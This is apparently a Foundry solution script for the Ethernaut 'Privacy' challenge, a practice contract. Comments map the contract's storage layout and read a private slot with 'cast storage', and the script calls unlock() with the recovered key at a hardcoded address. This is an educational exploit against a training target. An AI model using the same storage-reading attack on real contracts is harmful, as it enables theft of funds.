// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Broadcast} from "./helper/Broadcast.sol";
import {Privacy} from "../src/L12Privacy.sol";

/**
 * @notice
 *  // slot 0
 *  bool public locked = true;
 *  // slot 1
 *     uint256 public ID = block.timestamp;
 *     // slot 2
 *     uint8 private flattening = 10;
 *     uint8 private denomination = 255;
 *     uint16 private awkwardness = uint16(block.timestamp);
 *
 *     // slot 3, 4, 5 - data[2]
 *     bytes32[3] private data;
 */

// 0x524F04724632eED237cbA3c37272e018b3A7967e

// cast storage <CONTRACT_ADDRESS> 0
// 0x7c4132911140941f6873d6de6aaf49338f9d8e96290e457f8e061096f66518fe

contract L12PrivacyAttack is Script, Broadcast {
    Privacy privacy = Privacy(0x524F04724632eED237cbA3c37272e018b3A7967e);
    bytes16 constant PASSWORD = bytes16(bytes32(0x7c4132911140941f6873d6de6aaf49338f9d8e96290e457f8e061096f66518fe));

    function run() public broadcast {
        privacy.unlock(PASSWORD);
    }
}
